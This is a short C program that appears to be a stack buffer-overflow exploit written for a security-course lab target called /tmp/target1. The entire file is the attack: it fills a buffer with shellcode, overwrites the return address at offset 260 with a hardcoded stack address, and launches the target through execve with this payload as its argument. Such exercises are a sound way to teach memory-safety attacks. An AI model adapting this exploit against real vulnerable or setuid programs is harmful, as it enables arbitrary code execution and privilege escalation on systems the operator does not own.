#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  char *args[3];
  char *env[1];

  char exploit[268];
  memset(exploit, 0xff, 264);
  exploit[264] = '\0';
  memcpy(exploit, shellcode, sizeof(shellcode) - 1);
  int *ret = (int *)(exploit + 260);
  *ret = 0xbffffc50;;

  args[0] = TARGET; args[1] = exploit; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
